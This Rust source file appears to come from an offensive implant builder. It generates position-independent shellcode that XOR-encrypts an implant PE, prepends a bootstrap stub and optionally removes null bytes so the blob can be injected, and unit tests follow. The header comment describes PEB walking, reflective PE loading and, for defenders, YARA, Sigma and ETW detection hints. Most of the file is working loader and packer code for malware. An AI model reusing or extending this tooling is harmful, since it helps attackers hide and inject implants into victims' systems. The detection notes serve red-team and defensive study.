//! Position-independent shellcode wrapper generation.
//!
//! Generates a PIC shellcode blob that:
//! 1. Resolves kernel32.dll via PEB walking
//! 2. Resolves VirtualAlloc, VirtualProtect
//! 3. Decrypts embedded payload (XOR with rolling key)
//! 4. Loads PE headers + sections into allocated memory
//! 5. Processes relocations and imports
//! 6. Calls entry point
//!
//! ## Output Layout
//! ```text
//! [bootstrap stub] [key_len:u32_le] [key_bytes] [payload_len:u32_le] [encrypted_payload]
//! ```
//!
//! ## Detection (Blue Team)
//! - YARA: `gs:[0x60]` (x64) or `fs:[0x30]` (x86) PEB access sequences
//! - Sigma: Large RWX memory allocations followed by PE section mapping
//! - ETW: `VirtualAlloc` with `PAGE_EXECUTE_READWRITE` from non-image memory

use crate::encode;
use crate::encrypt;
use crate::stub;
use crate::{Arch, BuilderError};

/// Configuration for shellcode generation.
#[derive(Debug, Clone)]
pub struct ShellcodeConfig {
    /// Path to the implant PE file on disk.
    pub payload_path: String,
    /// XOR key byte for the bootstrap decryption loop.
    /// A full multi-byte key is generated internally; this byte is used for
    /// the fast single-byte inner loop in the stub.
    pub xor_key: u8,
    /// Target architecture.
    pub arch: Arch,
    /// If true, the final shellcode will contain no null bytes.
    pub null_free: bool,
}

impl Default for ShellcodeConfig {
    fn default() -> Self {
        Self {
            payload_path: String::new(),
            xor_key: 0x41,
            arch: Arch::X64,
            null_free: false,
        }
    }
}

/// Generate a PIC shellcode blob from an implant PE.
///
/// The `payload` argument is the raw bytes of the implant EXE/DLL.
/// Returns the assembled shellcode ready for injection.
pub fn generate_shellcode(
    payload: &[u8],
    config: &ShellcodeConfig,
) -> Result<Vec<u8>, BuilderError> {
    if payload.is_empty() {
        return Err(BuilderError::InvalidPe("empty payload".into()));
    }

    // 1. Validate PE header (minimal check: MZ magic)
    validate_pe(payload)?;

    // 2. Encrypt the payload
    let key = vec![config.xor_key];
    let encrypted = encrypt::xor_encrypt(payload, &key);

    // 3. Generate the architecture-specific bootstrap stub
    let bootstrap = stub::generate_stub(config)?;

    // 4. Assemble: [stub] [key_len:u32] [key] [payload_len:u32] [encrypted_payload]
    let mut shellcode = Vec::with_capacity(
        bootstrap.len() + 4 + key.len() + 4 + encrypted.len(),
    );
    shellcode.extend_from_slice(&bootstrap);
    shellcode.extend_from_slice(&(key.len() as u32).to_le_bytes());
    shellcode.extend_from_slice(&key);
    shellcode.extend_from_slice(&(encrypted.len() as u32).to_le_bytes());
    shellcode.extend_from_slice(&encrypted);

    // 5. Optional null-byte elimination
    if config.null_free {
        shellcode = encode::eliminate_nulls(&shellcode)?;
    }

    Ok(shellcode)
}

/// Minimal PE validation — checks for the MZ DOS header magic.
fn validate_pe(data: &[u8]) -> Result<(), BuilderError> {
    if data.len() < 64 {
        return Err(BuilderError::InvalidPe(
            "payload too small for a valid PE".into(),
        ));
    }
    if data[0] != 0x4D || data[1] != 0x5A {
        return Err(BuilderError::InvalidPe(
            "missing MZ magic bytes".into(),
        ));
    }
    Ok(())
}

/// Calculate the total shellcode size for a given payload and config
/// (useful for size-budget checks without actually generating).
pub fn estimate_size(payload_len: usize, config: &ShellcodeConfig) -> usize {
    let stub_len = stub::generate_stub(config).map(|s| s.len()).unwrap_or(128);
    let overhead = 4 + 1 + 4; // key_len + key(1) + payload_len
    let base = stub_len + overhead + payload_len;
    if config.null_free {
        // Worst case: every byte is 0x00 or 0xFF, doubling in size.
        base * 2
    } else {
        base
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Build a minimal valid PE for testing (MZ header + PE signature).
    fn minimal_pe() -> Vec<u8> {
        let mut pe = vec![0u8; 256];
        pe[0] = 0x4D; // M
        pe[1] = 0x5A; // Z
        // e_lfanew at offset 60 -> points to PE sig at 0x80
        pe[60] = 0x80;
        pe[0x80] = 0x50; // P
        pe[0x81] = 0x45; // E
        pe[0x82] = 0x00;
        pe[0x83] = 0x00;
        pe
    }

    #[test]
    fn test_generate_shellcode_valid_pe() {
        let pe = minimal_pe();
        let config = ShellcodeConfig {
            payload_path: String::new(),
            xor_key: 0x42,
            arch: Arch::X64,
            null_free: false,
        };
        let sc = generate_shellcode(&pe, &config).unwrap();
        assert!(!sc.is_empty());
        assert!(sc.len() > pe.len()); // stub + header overhead
    }

    #[test]
    fn test_generate_shellcode_x86() {
        let pe = minimal_pe();
        let config = ShellcodeConfig {
            payload_path: String::new(),
            xor_key: 0x42,
            arch: Arch::X86,
            null_free: false,
        };
        let sc = generate_shellcode(&pe, &config).unwrap();
        assert!(!sc.is_empty());
    }

    #[test]
    fn test_generate_shellcode_null_free() {
        let pe = minimal_pe();
        let config = ShellcodeConfig {
            payload_path: String::new(),
            xor_key: 0x42,
            arch: Arch::X64,
            null_free: true,
        };
        let sc = generate_shellcode(&pe, &config).unwrap();
        assert!(!sc.is_empty());
        assert!(!encode::contains_nulls(&sc));
    }

    #[test]
    fn test_empty_payload_rejected() {
        let config = ShellcodeConfig::default();
        assert!(generate_shellcode(&[], &config).is_err());
    }

    #[test]
    fn test_invalid_pe_rejected() {
        let config = ShellcodeConfig::default();
        assert!(generate_shellcode(&[0x00; 128], &config).is_err());
    }

    #[test]
    fn test_too_small_rejected() {
        let config = ShellcodeConfig::default();
        assert!(generate_shellcode(&[0x4D, 0x5A], &config).is_err());
    }

    #[test]
    fn test_xor_encryption_applied() {
        let pe = minimal_pe();
        let config = ShellcodeConfig {
            payload_path: String::new(),
            xor_key: 0xFF,
            arch: Arch::X64,
            null_free: false,
        };
        let sc = generate_shellcode(&pe, &config).unwrap();
        // The encrypted payload bytes should not start with MZ
        // (after the stub + header). Find the payload region:
        // stub + 4(key_len) + 1(key) + 4(payload_len) = offset to encrypted data
        // The encrypted MZ (0x4D ^ 0xFF, 0x5A ^ 0xFF) = (0xB2, 0xA5)
        // Just verify the shellcode doesn't contain the original MZ at the expected spot.
        let stub_config = ShellcodeConfig {
            payload_path: String::new(),
            xor_key: 0xFF,
            arch: Arch::X64,
            null_free: false,
        };
        let stub_len = stub::generate_stub(&stub_config).unwrap().len();
        let payload_offset = stub_len + 4 + 1 + 4;
        if payload_offset + 1 < sc.len() {
            // The first two bytes of the encrypted region should NOT be MZ.
            assert!(sc[payload_offset] != 0x4D || sc[payload_offset + 1] != 0x5A);
        }
    }

    #[test]
    fn test_estimate_size() {
        let config = ShellcodeConfig::default();
        let est = estimate_size(1024, &config);
        assert!(est > 1024);
    }

    #[test]
    fn test_shellcode_contains_stub_magic() {
        let pe = minimal_pe();
        let config = ShellcodeConfig {
            payload_path: String::new(),
            xor_key: 0x42,
            arch: Arch::X64,
            null_free: false,
        };
        let sc = generate_shellcode(&pe, &config).unwrap();
        assert!(sc.windows(4).any(|w| w == b"KRK1"));
    }
}
